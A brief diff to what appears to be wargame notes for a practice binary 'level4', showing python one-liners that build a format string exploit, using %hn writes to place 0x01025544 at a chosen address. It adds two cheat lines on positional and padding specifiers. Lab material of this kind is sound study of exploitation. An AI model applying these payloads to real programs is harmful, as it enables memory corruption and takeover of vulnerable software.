@@ -5,3 +5,6 @@ we want to write 0x01025544 so 0x0102 (258 in decimal) at 0x08049812 (address of
 python -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08" + "%12$p %13$p"' | ./level4
 
 python -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08%250x%13$hn%21570x%12$hn"' | ./level4
+
+%...$x	switch elements
+%...x	padding data
